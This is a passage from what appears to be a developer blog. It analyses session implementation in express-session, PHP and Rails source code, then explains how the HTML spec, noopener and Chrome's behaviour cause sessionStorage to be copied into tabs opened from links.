secrets.length; i++) &#123; var result = signature.unsign(val, secrets[i]); if (result !== false) &#123; return result; &#125; &#125; return false; &#125; Now, the last question remains: where is the session information stored? Is it stored in memory, files, or somewhere else? Actually, this is clearly written in the code. By default, it is stored in memory: var warning = 'Warning: connect.session() MemoryStore is not\\n' + 'designed for a production environment, as it will leak\\n' + 'memory, and will not scale past a single process.'; // get the session store var store = opts.store || new MemoryStore() // notify user that this store is not // meant for a production environment /* istanbul ignore next: not tested */ if (env === 'production' &amp;&amp; store instanceof MemoryStore) &#123; console.warn(warning); &#125; So how is it stored? You can refer to session&#x2F;memory.js: function MemoryStore() &#123; Store.call(this) this.sessions = Object.create(null) &#125; MemoryStore.prototype.get = function get(sessionId, callback) &#123; defer(callback, null, getSession.call(this, sessionId)) &#125; MemoryStore.prototype.set = function set(sessionId, session, callback) &#123; this.sessions[sessionId] = JSON.stringify(session) callback &amp;&amp; defer(callback) &#125; function getSession(sessionId) &#123; var sess = this.sessions[sessionId] if (!sess) &#123; return &#125; // parse sess = JSON.parse(sess) return sess &#125; First, create a clean object using Object.create(null) (this is a common method, for those who haven’t seen it before, you can refer to: Detailed Explanation of Object.create(null)). Then, use the sessionID as the key and JSON.stringify(session) as the value, and store it in this object. So, in essence, the session information of express-session is stored in a variable by default, so if you end the process and restart it, all session data will be lost. There may also be memory leak issues, so it is not recommended for production use. If you want to use it in production, you must find a store to use, such as connect-redis, which can be used with express-session to store session information in redis. The above is the original code analysis of the commonly used middleware in Express: express-session. From the above paragraphs, we clearly know how the sessionID is generated and how it is stored in cookies, as well as where the session information is stored. PHP (version 7.2)PHP has built-in session mechanism, so you don’t need to use any framework, and the usage is also very simple: &lt;?php session_start(); if (empty($_SESSION['views'])) &#123; $_SESSION['views'] = 1; &#125; else &#123; $_SESSION['views']++; &#125; echo $_SESSION['views']; ?> In fact, it is similar to the usage of express-session, except that one is req.session and the other is $_SESSION. I originally wanted to look at the PHP source code directly, just like I did with express-session, and then find out how to implement it. However, because PHP’s source code is all in C, it is difficult for someone like me who has hardly written C to understand, so I can only do it the other way around. First, I will introduce how PHP’s Session mechanism is implemented, and then look for evidence from the source code. First of all, PHP’s Session mechanism is similar to express-session, both of which store a sessionID in a cookie and store session information on the server. express-session is stored in memory by default, while PHP is stored in a file by default. All of these can be adjusted in the PHP configuration file, which is written in php.ini. Below is an example of some related settings in my file: [Session] ; Handler used to store/retrieve data. ; http://php.net/session.save-handler session.save_handler=files ; Argument passed to save_handler. In the case of files, this is the path ; where data files are stored. Note: Windows users have to change this ; variable in order to use PHP's session functions. ; ; The path can be defined as: ; ; session.save_path = \"N;/path\" session.save_path=\"/opt/lampp/temp/\" ; Name of the session (used as cookie name). ; http://php.net/session.name session.name=PHPSESSID ; Handler used to serialize data. php is the standard serializer of PHP. ; http://php.net/session.serialize-handler session.serialize_handler=php In the cookie, you can see a PHPSESSID, which looks something like this: fc46356f83dcf5712205d78c51b47c4d, which is the sessionID used by PHP. Then, you can check session.save_path to see where your session information is stored. The file name is easy to recognize, it is sess_ plus the sessionID: root@debian:&#x2F;opt&#x2F;lampp&#x2F;temp# ls adminer.invalid adminer.version sess_04719a35fb67786d574ec6eca969f7cb sess_fc46356f83dcf5712205d78c51b47c4d If you open the session file, the content will be the result after serialization: views|i:5; This is the true face of PHP session. All session information is stored in a file. If you want to study the relevant source code of PHP session, the most important files are these two: ext&#x2F;session&#x2F;session.c and ext&#x2F;session&#x2F;mod_files.c. The former manages the session life cycle, and the latter is responsible for storing or reading the session in the file. The latter is actually similar to the Store we saw in express-session. As long as you follow the same interface, you can write another mod yourself, such as mod_redis.c. Next, let’s find out how the sessionID is generated. You can directly search for relevant keywords in mod_files.c, and you will find the following code: /* * Create session ID. * PARAMETERS: PS_CREATE_SID_ARGS in php_session.h * RETURN VALUE: Valid session ID(zend_string *) or NULL for FAILURE. * * PS_CREATE_SID_FUNC() must check collision. i.e. Check session data if * new sid exists already. * *mod_data is guaranteed to have non-NULL value. * NOTE: Default php_session_create_id() does not check collision. If * NULL is returned, session module create new ID by using php_session_create_id(). * If php_session_create_id() fails due to invalid configuration, it raises E_ERROR. * NULL return value checks from php_session_create_id() is not required generally. */ PS_CREATE_SID_FUNC(files) &#123; zend_string *sid; int maxfail = 3; PS_FILES_DATA; do &#123; sid = php_session_create_id((void**)&amp;data); if (!sid) &#123; if (--maxfail &lt; 0) &#123; return NULL; &#125; else &#123; continue; &#125; &#125; /* Check collision */ /* FIXME: mod_data(data) should not be NULL (User handler could be NULL) */ if (data &amp;&amp; ps_files_key_exists(data, ZSTR_VAL(sid)) == SUCCESS) &#123; if (sid) &#123; zend_string_release(sid); sid = NULL; &#125; if (--maxfail &lt; 0) &#123; return NULL; &#125; &#125; &#125; while(!sid); return sid; &#125; Here, php_session_create_id is called to generate the sessionID, and then it checks if there are any duplicate IDs generated, retrying up to three times if necessary. php_session_create_id is located in the session.c file: #define PS_EXTRA_RAND_BYTES 60 PHPAPI zend_string *php_session_create_id(PS_CREATE_SID_ARGS) /* &#123;&#123;&#123; */ &#123; unsigned char rbuf[PS_MAX_SID_LENGTH + PS_EXTRA_RAND_BYTES]; zend_string *outid; /* Read additional PS_EXTRA_RAND_BYTES just in case CSPRNG is not safe enough */ if (php_random_bytes_throw(rbuf, PS(sid_length) + PS_EXTRA_RAND_BYTES) == FAILURE) &#123; return NULL; &#125; outid = zend_string_alloc(PS(sid_length), 0); ZSTR_LEN(outid) = bin_to_readable(rbuf, PS(sid_length), ZSTR_VAL(outid), (char)PS(sid_bits_per_character)); return outid; &#125; The key point is actually only this one: php_random_bytes_throw. If you continue to trace it, you will find ext&#x2F;standard&#x2F;php_random.h, and then find ext&#x2F;standard&#x2F;random.c, which is the actual place where random numbers are generated. However, it takes a long time to understand the function found at the end, so I didn’t look into it in detail. In any case, there are different ways of generating sessionIDs on different operating systems, one of which even uses &#x2F;dev&#x2F;urandom. After knowing how the sessionID is generated, let’s take a look at how PHP serializes session information. You can see a function called session_encode in the official documentation, and the output is exactly the same as the data we see in the session file. The description of this function is: session_encode() returns a serialized string of the contents of the current session data stored in the $_SESSION superglobal. By default, the serialization method used is internal to PHP, and is not the same as serialize(). The serialization method can be set using session.serialize_handler. Next, we directly search for session_encode in session.c, and find this section: /* &#123;&#123;&#123; proto string session_encode(void) Serializes the current setup and returns the serialized representation */ static PHP_FUNCTION(session_encode) &#123; zend_string *enc; if (zend_parse_parameters_none() == FAILURE) &#123; return; &#125; enc = php_session_encode(); if (enc == NULL) &#123; RETURN_FALSE; &#125; RETURN_STR(enc); &#125; It’s just a wrapper for php_session_encode, and php_session_encode just calls something else: static zend_string *php_session_encode(void) /* &#123;&#123;&#123; */ &#123; IF_SESSION_VARS() &#123; if (!PS(serializer)) &#123; php_error_docref(NULL, E_WARNING, \"Unknown session.serialize_handler. Failed to encode session object\"); return NULL; &#125; return PS(serializer)->encode(); &#125; else &#123; php_error_docref(NULL, E_WARNING, \"Cannot encode non-existent session\"); &#125; return NULL; &#125; /* &#125;&#125;&#125; */ The key point is return PS(serializer)-&gt;encode();. Actually, when you get to this point, you may get stuck because you don’t know where serializer comes from. But if you look down a bit, you’ll find something that should be related: #define PS_DELIMITER '|' PS_SERIALIZER_ENCODE_FUNC(php) /* &#123;&#123;&#123; */ &#123; smart_str buf = &#123;0&#125;; php_serialize_data_t var_hash; PS_ENCODE_VARS; PHP_VAR_SERIALIZE_INIT(var_hash); PS_ENCODE_LOOP( smart_str_appendl(&amp;buf, ZSTR_VAL(key), ZSTR_LEN(key)); if (memchr(ZSTR_VAL(key), PS_DELIMITER, ZSTR_LEN(key))) &#123; PHP_VAR_SERIALIZE_DESTROY(var_hash); smart_str_free(&amp;buf); return NULL; &#125; smart_str_appendc(&amp;buf, PS_DELIMITER); php_var_serialize(&amp;buf, struc, &amp;var_hash); ); smart_str_0(&amp;buf); PHP_VAR_SERIALIZE_DESTROY(var_hash); return buf.s; &#125; /* &#125;&#125;&#125; */ You will know it is related because of the line #define PS_DELIMITER &#39;|&#39;, which appears in the session file, and you can guess that it is used to separate something. The actual value is handled by php_var_serialize. If you continue to trace php_var_serialize, you can find ext&#x2F;standard&#x2F;var.c (you can easily find this file using GitHub’s search function), and finally you will find the real processing place: php_var_serialize_intern, which calls different functions for different forms. For our example, the views stored in the session are represented by a number, so it will run this function: static inline void php_var_serialize_long(smart_str *buf, zend_long val) /* &#123;&#123;&#123; */ &#123; smart_str_appendl(buf, \"i:\", 2); smart_str_append_long(buf, val); smart_str_appendc(buf, ';'); &#125; /* &#125;&#125;&#125; */ By following this, we can see why the serialized session result was views|i:5;. The | is used to separate the key and value, i represents the type, 5 represents the actual number, and ; is the end symbol. The above is the related source code analysis of PHP Session mechanism. We have briefly looked at how to generate sessionID and how to serialize session information. We also know that by default, the cookie name will be called PHPSESSID, and the session content will be stored in a file. Finally, I would like to share two interesting articles related to PHP Session: HITCON CTF 2018 - One Line PHP Challenge [Web Security] LFI Leads to RCE via Session File Rails (version 5.2)Rails is a Ruby web framework, commonly known as Ruby on Rails. I chose this framework because I already knew that its method of storing sessions is different. I was curious about how Rails generates sessionIDs, so I searched for “session” in the GitHub repo and found this file: rails&#x2F;actionpack&#x2F;test&#x2F;dispatch&#x2F;session&#x2F;cookie_store_test.rb. It is a test, but sometimes tests are very helpful in finding code because they contain a lot of related functions and parameters. I observed it for a while and found that the term “session_id” appeared many times in the file. So I used this keyword to search and found rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;session&#x2F;cookie_store.rb, where the comments clearly explain how Rails implements sessions: # This cookie-based session store is the Rails default. It is # dramatically faster than the alternatives. # # Sessions typically contain at most a user_id and flash message; both fit # within the 4K cookie size limit. A CookieOverflow exception is raised if # you attempt to store more than 4K of data. # # The cookie jar used for storage is automatically configured to be the # best possible option given your application's configuration. # # If you only have secret_token set, your cookies will be signed, but # not encrypted. This means a user cannot alter their +user_id+ without # knowing your app's secret key, but can easily read their +user_id+. This # was the default for Rails 3 apps. # # Your cookies will be encrypted using your apps secret_key_base. This # goes a step further than signed cookies in that encrypted cookies cannot # be altered or read by users. This is the default starting in Rails 4. # # Configure your session store in &lt;tt>config/initializers/session_store.rb&lt;/tt>: # # Rails.application.config.session_store :cookie_store, key: '_your_app_session' # # In the development and test environments your application's secret key base is # generated by Rails and stored in a temporary file in &lt;tt>tmp/development_secret.txt&lt;/tt>. # In all other environments, it is stored encrypted in the # &lt;tt>config/credentials.yml.enc&lt;/tt> file. # # If your application was not updated to Rails 5.2 defaults, the secret_key_base # will be found in the old &lt;tt>config/secrets.yml&lt;/tt> file. # # Note that changing your secret_key_base will invalidate all existing session. # Additionally, you should take care to make sure you are not relying on the # ability to decode signed cookies generated by your app in external # applications or JavaScript before changing it. # # Because CookieStore extends Rack::Session::Abstract::Persisted, many of the # options described there can be used to customize the session cookie that # is generated. For example: # # Rails.application.config.session_store :cookie_store, expire_after: 14.days # # would set the session cookie to expire automatically 14 days after creation. # Other useful options include &lt;tt>:key&lt;/tt>, &lt;tt>:secure&lt;/tt> and # &lt;tt>:httponly&lt;/tt>. Rails uses cookie-based sessions by default because it is faster than other solutions. Although cookies have size limitations, they can only store flash messages and user IDs, which are far from the 4k limit. In Rails 3, cookies are only signed, not encrypted, which means that users can see the user ID but cannot change it (just like the sessionID we see in express-session, visible but cannot be changed). In Rails 4 and later, the cookie value is encrypted, and nothing can be seen. In the test environment, Rails automatically generates a secret for encryption, which can also be set through the Rails configuration file. In this file, there is also a function called generate_sid, which is used to generate sessionIDs. This function exists in rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;session&#x2F;abstract_store.rb: def generate_sid sid = SecureRandom.hex(16) sid.encode!(Encoding::UTF_8) sid end It directly calls the Ruby library SecureRandom to generate random numbers as sessionIDs. As for the key in the cookie, it can be adjusted by setting app.config.session_store. According to the code here: # Setup default session store if not already set in config/application.rb initializer :setup_default_session_store, before: :build_middleware_stack do |app| unless app.config.session_store? app_name = app.class.name ? app.railtie_name.chomp(\"_application\") : \"\" app.config.session_store :cookie_store, key: \"_#&#123;app_name&#125;_session\" end end The default value will be _#&#123;app_name&#125;_session, for example, if my app_name is huli, the cookie name will be _huli_session. Then the place where the session information is actually written into the cookie is in rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;session&#x2F;cookie_store.rb: def set_cookie(request, session_id, cookie) cookie_jar(request)[@key] = cookie end def get_cookie(req) cookie_jar(req)[@key] end def cookie_jar(request) request.cookie_jar.signed_or_encrypted end It will call signed_or_encrypted related to the cookie to handle it. Then I searched the documentation and found that the official document actually explains it very clearly: The session ID is generated using SecureRandom.hex which generates a random hex string using platform specific methods (such as OpenSSL, &#x2F;dev&#x2F;urandom or Win32 CryptoAPI) for generating cryptographically secure random numbers. Currently it is not feasible to brute-force Rails’ session IDs. The above paragraph describes how the sessionID is generated. The CookieStore uses the encrypted cookie jar to provide a secure, encrypted location to store session data. Cookie-based sessions thus provide both integrity as well as confidentiality to their contents. The encryption key, as well as the verification key used for signed cookies, is derived from the secret_key_base configuration value. As of Rails 5.2 encrypted cookies and sessions are protected using AES GCM encryption. This form of encryption is a type of Authenticated Encryption and couples authentication and encryption in single step while also producing shorter ciphertexts as compared to other algorithms previously used. The key for cookies encrypted with AES GCM are derived using a salt value defined by the config.action_dispatch.authenticated_encrypted_cookie_salt configuration value. This paragraph describes that AES GCM is used for encryption starting from Rails 5.2. There is another paragraph below that I didn’t copy, mainly mentioning what was written in the code comments before, that before Rails 4, only HMAC was used for verification, not encryption. And I found that this document is really well written after reading it. In addition to explaining these mechanisms clearly, it also introduces the Session Fixation Attack and CSRF that we mentioned in the previous article. If you want to study further, you can refer to the implementation of Cookie related in Rails: rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;cookies.rb, where the comments have detailed explanations, such as the encryption part: # Returns a jar that'll automatically encrypt cookie values before sending them to the client and will decrypt them for read. # If the cookie was tampered with by the user (or a 3rd party), +nil+ will be returned. # # If +secret_key_base+ and +secrets.secret_token+ (deprecated) are both set, # legacy cookies signed with the old key generator will be transparently upgraded. # # If +config.action_dispatch.encrypted_cookie_salt+ and +config.action_dispatch.encrypted_signed_cookie_salt+ # are both set, legacy cookies encrypted with HMAC AES-256-CBC will be transparently upgraded. # # This jar requires that you set a suitable secret for the verification on your app's +secret_key_base+. # # Example: # # cookies.encrypted[:discount] = 45 # # => Set-Cookie: discount=DIQ7fw==--K3n//8vvnSbGq9dA--7Xh91HfLpwzbj1czhBiwOg==; path=/ # # cookies.encrypted[:discount] # => 45 def encrypted @encrypted ||= EncryptedKeyRotatingCookieJar.new(self) end If you scroll down, you can see the complete code of EncryptedKeyRotatingCookieJar, or you can go further down and see rails&#x2F;activesupport&#x2F;lib&#x2F;active_support&#x2F;message_encryptor.rb, which is responsible for encryption, and the code looks like this: def _encrypt(value, **metadata_options) cipher = new_cipher cipher.encrypt cipher.key = @secret # Rely on OpenSSL for the initialization vector iv = cipher.random_iv cipher.auth_data = \"\" if aead_mode? encrypted_data = cipher.update(Messages::Metadata.wrap(@serializer.dump(value), metadata_options)) encrypted_data &lt;&lt; cipher.final blob = \"#&#123;::Base64.strict_encode64 encrypted_data&#125;--#&#123;::Base64.strict_encode64 iv&#125;\" blob = \"#&#123;blob&#125;--#&#123;::Base64.strict_encode64 cipher.auth_tag&#125;\" if aead_mode? blob end The cipher used here comes from openssl, so the bottom layer uses openssl. That should be enough for now, let’s not go any deeper. ConclusionIn this article, we looked at three different ways of storing sessions. The first is express-session, which stores session information in memory; the second is PHP, which stores it in a file; and the last is Rails, which uses the cookie-based session mentioned earlier to encrypt and store information directly in a cookie. In this series, in the first article, we understood the concept, in the second article, we deepened our understanding of Session by reading RFC again, and in the last article, we directly referred to the implementation of some mainstream frameworks to see how the sessionID we mentioned earlier should be generated, where session information should be stored, and how cookie-based sessions should be implemented. The purpose of writing this series is to help everyone understand these concepts clearly at once, so that they don’t have to look them up again every time they encounter them in the future. Finally, I hope this series is helpful to everyone, and if there are any errors, please leave a comment below. Here is the complete list of articles in this series: Plain Session and Cookie: Starting with Running a Grocery Store Shallow Talk about Session and Cookie: Let’s Read RFC Together Deep Dive into Session and Cookie: Implementation in Express, PHP, and Rails","link":"/2019/08/09/en/session-and-cookie-part3/"},{"title":"Starting a Journey with SessionStorage","text":"IntroductionIf you want to store something in the front-end of a website, which means storing it in the browser, there are basically a few options: Cookie LocalStorage SessionStorage IndexedDB Web SQL The last two are rarely used, and the last one, Web SQL, was declared deprecated a few years ago. Therefore, when it comes to storing data, most people mention the first three, with the first two being the most commonly used. After all, when storing data in the front-end, most data is expected to be stored for a period of time, and cookies and localStorage are designed for this purpose. However, sessionStorage is not, as it is only suitable for storing very short-term data. I don’t know if your understanding of sessionStorage is the same as mine, so let me explain my understanding: The biggest difference between sessionStorage and localStorage is that the former only exists in one tab. When you close the tab, the data is cleared, so a new tab will have a new sessionStorage, and different tabs will not share the same sessionStorage. However, if it is the same website, the same localStorage can be shared. But let me ask you this: Is it possible that in a certain scenario, I store something in sessionStorage in tab A, and then a new tab B can also read the sessionStorage in tab A? You might think it’s impossible, and I used to think so too, as did my colleagues. But it turns out that it is possible. I Don’t Understand SessionStorageAs mentioned in the introduction, my understanding of sessionStorage is that it only exists in one tab, and when the tab is closed, it disappears. Also, a new tab will not share the data from the original tab, so it is safe to assume that the sessionStorage in the tab can only be accessed by itself. However, in a technical sharing session within my company, my supervisor Howard shared a case: Suppose there is a page A that uses sessionStorage to store some data, and there is a hyperlink to page B within the same origin. Many people would expect that the sessionStorage in page B is empty. But no, it will inherit the sessionStorage from page A. Yes, it was this case that shattered my naive fantasy about sessionStorage. It turns out that two different tabs can share the same sessionStorage. Strictly speaking, it is not sharing, but the original sessionStorage will be “copied” to the new tab. If the value is changed on page A, page B cannot get the updated value. Page B only copies the sessionStorage at the moment the link is clicked. I have prepared a demo for everyone to play with, which is just two simple pages. Here is the URL: sessionStorage demo. The page looks like this: The code for this page is very simple. Basically, it sets a sessionStorage with name=guest and displays it on the screen. There is a hyperlink that can be clicked to open a new tab, and a button that randomly updates the value in sessionStorage: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;title>SessionStorage 範例&lt;/title> &lt;meta charset=\"utf-8\"> &lt;script> sessionStorage.setItem('name', 'guest') &lt;/script> &lt;/head> &lt;body> &lt;div> 進來這網站之後，會自動幫你設置一個 sessionStorage，name=\"guest\" &lt;br> 你可以打開 devtool -> applications 或是打開 console，或檢查下面內容確認 &lt;/div> &lt;div> sessionStorage 內容：&lt;b>&lt;/b> &lt;/div> &lt;button id=\"btn\">改變 sessionStorage 內容&lt;/button>&lt;br> &lt;a href=\"new_tab.html\" target=\"_blank\">Click me to see magic(?)&lt;/a> &lt;script> document.querySelector('b').innerText = sessionStorage.getItem('name') console.log('sessionStorage', sessionStorage) console.log('sessionStorage.name', sessionStorage.name) btn.addEventListener('click',() => &#123; sessionStorage.setItem('name', (Math.random()).toString(16)) document.querySelector('b').innerText = sessionStorage.getItem('name') console.log('updated sessionStorage', sessionStorage) console.log('updated sessionStorage.name', sessionStorage.name) &#125;) &lt;/script> &lt;/body> &lt;/html> If you click the hyperlink and go to the new page, you will see that the sessionStorage has been copied over: The code for this new page is as follows, and there is no line that sets sessionStorage: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;title>SessionStorage 範例&lt;/title> &lt;meta charset=\"utf-8\"> &lt;/head> &lt;body> &lt;div> 這網站沒有任何設置 sessionStorage 的程式碼&lt;br> 但如果你是從 index.html 的 a 連結點來的，你可以存取得到 &lt;/div> &lt;div> sessionStorage 內容：&lt;b>&lt;/b> &lt;/div> &lt;button id='btn'>重新抓取&lt;/button>&lt;br> &lt;a href=\"index.html\">Back to index.html&lt;/a> &lt;script> document.querySelector('b').innerText = sessionStorage.getItem('name') console.log('sessionStorage', sessionStorage) console.log('sessionStorage.name', sessionStorage.name) btn.addEventListener('click', () => &#123; document.querySelector('b').innerText = sessionStorage.getItem('name') console.log('latest sessionStorage', sessionStorage) console.log('latest sessionStorage.name', sessionStorage.name) &#125;) &lt;/script> &lt;/body> &lt;/html> Because it is a new tab, you now have two tabs, one is the original index.html, and the other is the new new_tab.html. You can click “Change the content of sessionStorage” in index.html, and you will see the screen update. Then go to new_tab.html and click “Reload”, and you will find that the value has not changed. This is what I said earlier, it is actually “copying”, not “sharing”. Because if it is sharing, when one place changes, the other place will change with it, but if it is copying, the original content and the copied content will not interfere with each other. When I heard about this behavior, I was shocked because it was different from what I thought. After the shock, the first thing I thought of was, “Is there a way to avoid this?” My colleagues tried several methods, but none of them worked. I suddenly thought of whether there were some attributes on the hyperlink, such as noopener, noreferrer, or nofollow, but after trying them out, they didn’t work. Later, I searched for information and finally found a correct solution. Also, I wanted to supplement related knowledge, so I went to see the spec of sessionStorage and found that it was written quite well. Therefore, I would like to share it with you. So, next, we will briefly look at the spec of Web storage. If you only want to know the answer to the problem, you can skip directly to the last paragraph. Web Storage specLocalStorage and sessionStorage are both types of Web Storage. The spec of Web Storage is here: https://html.spec.whatwg.org/multipage/webstorage.html#introduction-16 I think the introduction paragraph at the beginning is written simply and clearly: This specification introduces two related mechanisms, similar to HTTP session cookies, for storing name-value pairs on the client side It directly tells you what these two things are doing. They are two mechanisms similar to cookies for storing name-value pairs on the client side. The first is designed for scenarios where the user is carrying out a single transaction, but could be carrying out multiple transactions in different windows at the same time. Then, it first talks about the scenario where sessionStorage is needed. This paragraph will be clearer with the following example: Cookies don’t really handle this case well. For example, a user could be buying plane tickets in two different windows, using the same site. If the site used cookies to keep track of which ticket the user was buying, then as the user clicked from page to page in both windows, the ticket currently being purchased would “leak” from one window to the other, potentially causing the user to buy two tickets for the same flight without really noticing. The example is roughly like this: Suppose we only have cookies to use, and Xiao Ming is buying plane tickets. Because he wants to buy two “different” tickets, he opens two tabs. However, if the website is not well written and uses cookies to record which ticket he wants to buy, the following situation may occur: Xiao Ming clicked on a ticket from Taipei to Japan in tab A, and the website stored this information in a cookie. Xiao Ming clicked on a ticket from Taipei to New York in tab B, and the website stored this information in a cookie. Since the cookie is shared in tabs A and B, and the key is the same, the cookie now stores the ticket from Taipei to New York. Xiao Ming clicked on checkout in tab A and bought a ticket from Taipei to New York. Xiao Ming clicked on checkout in tab B and bought another ticket from Taipei to New York. So Xiao Ming bought duplicate tickets. This is the potential problem that may occur when information is stored in cookies. Therefore, sessionStorage is born to solve this problem. It can limit the information to “one session”, which is basically a tab from the perspective of the browser and will not interfere with other tabs. Further down, it will talk about the usage scenario of localStorage: The second storage mechanism is designed for storage that spans multiple windows, and lasts beyond the current session. In particular, web applications might wish to store megabytes of user data, such as entire user-authored documents or a user’s mailbox, on the client side for performance reasons. Again, cookies do not handle this case well, because they are transmitted with every request. Some websites may want to store a large amount of data in the browser for performance reasons, such as storing users’ emails. This is similar to creating a cache, where the stored data can be retrieved from the cache to speed up loading times. However, cookies are not suitable for this scenario because they are sent with every request. If you store 1MB of data in a cookie, every request to the website will be at least 1MB in size, and this unnecessary data will cause a lot of traffic. Therefore, localStorage was created to allow you to store a large amount of data without sending it to the server. There is also a warning in red below: The localStorage getter provides access to shared state. This specification does not define the interaction with other browsing contexts in a multiprocess user agent, and authors are encouraged to assume that there is no locking mechanism. A site could, for instance, try to read the value of a key, increment its value, then write it back out, using the new value as a unique identifier for the session; if the site does this twice in two different browser windows at the same time, it might end up using the same “unique” identifier for both sessions, with potentially disastrous effects. This means that because localStorage can be shared across pages, like other shared resources, you need to be aware of race conditions. For example, if a website reads a key called “id” from localStorage, increments it by 1, and uses it as a unique identifier for the page, two pages doing this at the same time could end up with the same id: Page A gets the id, which is 1. Page A increments the id by 1. At the same time, Page B also gets the id and gets 1. Page A writes the id back, and now the id is 2. Page B writes the incremented id back, but the id is still 2. Continuous actions are not guaranteed to be uninterrupted by other processes, which is why it is written that “authors are encouraged to assume that there is no locking mechanism” and to be careful of this situation. Next, you can see the Web Storage interface: It is worth noting that although the common usage is storage.setItem or storage.getItem, you can also use storage[key] = value and storage[key] directly. To delete, simply use delete storage[key]. If you cannot write to storage, a QuotaExceededError will be thrown. Chrome’s documentation on chrome.storage provides some related numbers. There is also a very common phrase: Dispatches a storage event on Window objects holding an equivalent Storage object. This is because when the contents of storage change, an event is actually sent out, and you can listen for this event to react accordingly. For example, you can use this trick to detect changes in localStorage in different tabs and respond in real-time. For more information, please see Window: storage event. By the way, the key in storage can be an emoji, so if you open this webpage, you can see: Next, the specs below describe the details of each method. I won’t repeat them here. If you keep scrolling down to the sessionStorage section, you’ll see this paragraph: Did you catch the key point? While creating a new auxiliary browsing context, the session storage is copied over. When creating an auxiliary browsing context, the sessionStorage is copied over. From the example given at the beginning of the article, we can guess that clicking on an “a” tag to open a new tab is probably “creating an auxiliary browsing context”. Next, let’s click on it and see what the process of creating an auxiliary browsing context is: The key point is step six, which mentions that sessionStorage will be copied over. So now the question has been redefined. Originally, we were curious about “when will sessionStorage be copied”, and the answer we got was “when creating an auxiliary browsing context”. Therefore, the question we are now curious about is “when will an auxiliary browsing context be created?” Furthermore, from the results, it appears that the example at the beginning was achieved by linking to an external website through an “a” tag, so we can guess that the answer may be in the spec of the link. Links specThe links-related spec is here: https://html.spec.whatwg.org/multipage/links.html Let’s first look at the definition of a link: Links are a conceptual construct, created by a, area, form, and link elements, that represent a connection between two resources, one of which is the current Document. There are two kinds of links in HTML: There are four elements that can create a link: &lt;a&gt;, &lt;area&gt;, &lt;form&gt;, and &lt;link&gt;, with &lt;area&gt; being the one I’ve never heard of before. Next, the document defines two types of links. The first is: Links to external resources These are links to resources that are to be used to augment the current document, generally automatically processed by the user agent. All external resource links have a fetch and process the linked resource algorithm which describes how the resource is obtained. You can think of this as what you use when you use the &lt;link&gt; element, such as CSS, which is a type of external resource. The second type is Hyperlinks: These are links to other resources that are generally exposed to the user by the user agent so that the user can cause the user agent to navigate to those resources, e.g. to visit them in a browser or download them. This is the hyperlink we are familiar with, which directs the browser (user agent) to other resources. Next, if we keep scrolling down, we can see that 4.6.4 Following hyperlinks mentions what the browser should do when the user clicks on a hyperlink: The key points are steps six and seven: Let noopener be the result of getting an element’s noopener with subject and targetAttributeValue. Let target and windowType be the result of applying the rules for choosing a browsing context given targetAttributeValue, source, and noopener. Here, noopener‘s value is determined through the process outlined in the spec: Our example meets the second condition, where there is no opener attribute and the target is _blank, so noopener will be true. Next, we look at step seven, which has a link to “the rules for choosing a browsing context” that takes us back to the browsing context spec. When choosing a browsing context, there are several steps to determine which one to select. None of the cases we are looking for (where the name is _blank) match the previous conditions, so we move directly to step eight: Otherwise, a new browsing context is being requested, and what happens depends on the user agent’s configuration and abilities — it is determined by the rules given for the first applicable option from the following list: There are several rules to determine what action to take, and our example falls under this rule: From the process, we can see that if noopener is true in step three, a new top-level browsing context is created. Otherwise, an auxiliary browsing context is created. So, if we reach this point and noopener is false, an auxiliary browsing context is created, and the sessionStorage is copied over. Wait a minute… isn’t our noopener true? Based on our situation, the spec clearly states that it should be true, so a new top-level browsing context should be created, and the sessionStorage should not be copied over. Did I miss something? Getting Confused by the Spec on the First TryI was confident when I started writing this article, but then I came across the situation above: “Huh, why doesn’t the actual behavior match the spec?” I kept thinking that I had missed something, so I checked it several times, and found that it was correct. noopener should indeed be true, so an auxiliary browsing context should not be created, and the sessionStorage should not be copied over. However, what I observed in Chrome was not like this. So I suddenly thought of a possibility: Chrome did not follow the spec. Here, it is important to note that the spec we are looking at is the latest spec, but browsers usually do not keep up with the latest version, and some things may be breaking changes, so they may be slower. Therefore, I speculated that the spec had been changed, and Chrome was following the old behavior. With this speculation, I searched for related keywords and found a commit: Make target&#x3D;_blank imply noopener; support opener. This is a commit from February 7, 2019, and in the diff, we can see this change: In the old spec, noopener is only true if the noopener or noreferrer attribute is true, otherwise it is false. Therefore, the behavior observed at the beginning is consistent with the old spec. We opened a new page with a link using the a tag, without setting noopener and noreferrer, so a new auxiliary browsing context was created and sessionStorage was copied over. Now that we have a reasonable and authoritative explanation, we only have a few more questions to address: What are noopener and noreferrer? Why did the spec make this change? The noopener and noreferrer attributes were first seen by the author in May 2016. When using the a tag to link from website A to website B, website B can obtain window.opener, which is equivalent to website A’s window. Therefore, if I execute window.opener.location &#x3D; ‘phishing_site_url’ on website B, I can redirect website A to another location. The solution is to add the rel&#x3D;”noopener” attribute. The noreferrer attribute is related to the Referer HTTP request header. If I link from website A to website B, website B’s Referer will be the URL of website A, so it will know where you came from. Adding this attribute tells the browser not to include the Referer header. To see more details, you can refer to this issue: target&#x3D;_blank rel&#x3D;noreferrer implies noopener. Originally, there were concerns that some old browsers might have problems, so no changes were made. Later, someone provided a lot of browser testing data, and after confirming that there were no problems, changes were made. Let’s bring the topic back to the opener issue. When this issue was first revealed, I remember it received a lot of attention, and there were a lot of related discussions on the spec’s repo. In fact, many people were surprised that the default behavior was like this. You can refer to this thread for related discussions: Windows opened via a target&#x3D;_blank should not have an opener by default, and this PR: Make target&#x3D;_blank imply noopener; support opener. Anyway, later on, Safari and Firefox made changes to this point. When using target=_blank, the default opener will be noopener. What about Chrome? Sorry, not yet. You can refer to: Issue 898942: Anchor target&#x3D;_blank should imply rel&#x3D;noopener. Back to sessionStorageAfter going around in circles and looking at a lot of specs and bug trackers, we finally come back to the original topic: sessionStorage. The spec says that if an auxiliary browsing context is created, sessionStorage will be copied over. And if we add rel=&quot;noopener&quot;, this behavior will not occur. So this is the correct answer to the initial problem: “Add rel=&quot;noopener&quot;“. But as I mentioned at the beginning, I tried all of these and none of them worked. Why is that? This is because Chrome does not yet support this behavior: Issue 771959: Do not copy sessionStorage when a window is created with noopener. And although Safari says that 